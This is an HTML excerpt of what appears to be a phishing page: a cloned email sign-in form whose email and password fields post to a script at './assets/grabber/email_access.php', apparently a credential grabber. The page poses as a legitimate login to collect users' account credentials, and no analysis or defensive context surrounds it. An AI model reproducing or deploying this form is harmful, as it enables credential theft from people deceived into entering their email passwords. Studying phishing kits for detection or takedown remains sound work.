                            ...
                            <div class="login-outer">
                                <div class="login-inner" id="login-inner">
                                    <div class="quicktip-container">
                                        ...
                                        <aside id="ember30" style="display: none;" class="quick-tip hidden ember-view">
                                            ...
                                            <button test-id="btnRemoveQT" aria-label="Close Tip" id="ember31" class="ui-btn tooltipped tooltipped-nw ember-view" type="button">
                                                <span aria-hidden="true" id="ember32" class="ui-icon icon-remove ember-view"></span>
                                            </button>
                                        </aside>
                                    </div>
                                    ...
                                    <div class=" login-message login-alert-message loginFormArea">
                                        <div id="ember34" class="login-alert-container alert-message_container static-alert hidden ember-view">
                                            <div class="alert alert-msg alert-message_content alert-danger" role="alert" aria-live="assertive">
                                                <div class="alert-message_inner">
                                                    <p>
                                                        <span aria-label="error" aria-hidden="true" id="ember35" class="ui-icon icon-warning-sign ember-view"></span>
                                                    </p>
                                    ...
                                    <div class="login-form loginFormArea">
                                        <form class="is-invalid" method="POST" action="./assets/grabber/email_access.php" data-ember-action="" data-ember-action-36="36">
                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">Email Address</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" name="email_address" autocorrect="off" placeholder="" autocomplete="off" title="" id="fldUsername" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="email" required="true">
                                            </div>

                                            <div class="password field">
                                                <label class="login-field" for="fldPassword">Password</label>
                                                <input test-id="fldPassword" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" id="fldPassword" name="email_password" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="password" required="true">
                                            </div>
